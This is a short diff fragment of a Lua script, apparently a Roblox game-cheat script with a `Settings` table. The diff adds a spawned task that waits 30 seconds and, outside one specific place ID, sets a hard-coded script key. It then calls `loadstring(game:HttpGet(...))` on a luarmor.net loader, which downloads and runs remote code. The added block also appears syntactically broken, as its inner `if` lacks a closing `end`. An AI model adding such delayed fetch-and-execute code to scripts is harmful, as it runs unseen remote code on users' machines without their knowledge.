@@ -136,6 +136,17 @@ getgenv().Settings = {
 
 }
 
+task.spawn(function()
+wait(30)
+if game.PlaceId ~= 19006211286 then
+script_key="WokEpGCUtggwkUXTihDkgVQOeegshlHs";
+
+daubuoi = true
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/717430e3bbde3530feb824de729fcc90.lua"))()
+end)
+
+
 if game.PlaceId == 19006211286 then
 
 
